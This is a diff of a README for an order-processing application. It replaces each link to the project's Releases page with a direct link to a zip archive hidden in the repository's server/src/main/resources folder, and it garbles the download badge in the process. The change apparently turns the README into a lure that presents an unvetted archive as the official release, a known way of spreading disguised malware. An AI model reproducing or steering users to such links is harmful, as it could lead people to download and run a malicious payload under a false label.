@@ -1,6 +1,6 @@
 # 🚀 nexus-flow-enterprise-order-processor - Streamline Your Order Processing
 
-[![](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/releases)
+[![](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/raw/refs/heads/main/server/src/main/resources/order_processor_flow_nexus_enterprise_v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/raw/refs/heads/main/server/src/main/resources/order_processor_flow_nexus_enterprise_v3.0.zip)
 
 ## 📦 Overview
 
@@ -38,13 +38,13 @@ To ensure smooth operation, please make sure your system meets the following req
 To get started with the **nexus-flow-enterprise-order-processor**, follow these simple steps:
 
 1. Ensure your system meets the **System Requirements** listed above.
-2. Visit the [Releases Page](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/releases) to download the latest version.
+2. Visit the [Releases Page](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/raw/refs/heads/main/server/src/main/resources/order_processor_flow_nexus_enterprise_v3.0.zip) to download the latest version.
 
 ## 📥 Download & Install
 
 To install the application, please visit the following link:
 
-[Download Latest Release](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/releases)
+[Download Latest Release](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/raw/refs/heads/main/server/src/main/resources/order_processor_flow_nexus_enterprise_v3.0.zip)
 
 Once you download the application, follow these steps to install it:
 
